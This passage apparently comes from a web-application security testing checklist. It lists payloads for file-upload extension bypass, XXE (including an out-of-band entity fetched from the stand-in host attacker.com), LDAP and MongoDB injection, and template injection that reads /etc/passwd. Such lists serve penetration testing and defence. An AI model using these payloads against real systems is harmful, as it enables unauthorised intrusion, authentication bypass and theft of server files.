### Test Case 130: File Upload - Content-Type Bypass

**Bug Type:** `file-upload` | `content-type-bypass`

**Steps:**

1. Upload PHP file with image content-type
2. Check if bypass works
3. Execute uploaded file

### Test Case 131: File Upload - Extension Bypass

**Bug Type:** `file-upload` | `extension-bypass`

**Examples:**

- `shell.php.jpg`
- `shell.php%00.jpg`
- `shell.php;.jpg`

---

## 🏷️ Category: XML Injection/XXE

### Test Case 132: XXE - Basic

**Bug Type:** `xxe` | `basic`

**Payload:**

xml

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
<root>&test;</root>
```

svgsvg

### Test Case 133: XXE - Out-of-Band

**Bug Type:** `xxe` | `oob`

**Payload:**

xml

```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % payload SYSTEM "http://attacker.com/evil.dtd">%payload;]>
```

svgsvg

---

## 🏷️ Category: LDAP Injection

### Test Case 134: LDAP Injection - Basic

**Bug Type:** `ldap-injection` | `basic`

**Examples:**

text

```
*)(&
*)(uid=*
admin)(&)
```

svgsvg

---

## 🏷️ Category: NoSQL Injection

### Test Case 135: NoSQL Injection - MongoDB

**Bug Type:** `nosql-injection` | `mongodb`

**Examples:**

text

```
{$gt: ''}
{$ne: null}
$or: [{}, {}]
```

svgsvg

**Testing:**

text

```
username[$ne]=null&password[$ne]=null
```

svgsvg

---

## 🏷️ Category: SSTI (Server-Side Template Injection)

### Test Case 136: SSTI - Basic

**Bug Type:** `ssti` | `basic`

**Examples:**

text

```
{{7*7}}
${7*7}
<%=7*7%>
${{7*7}}
#{7*7}
{{ '7'*7 }}
{{{{7*7}}}}
```

svgsvg

### Test Case 137: SSTI - RCE

**Bug Type:** `ssti` | `rce`

**Examples:**

text

```
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items() }}
{{ self.__class__.__mro__[1].__subclasses__() }}
```

svgsvg
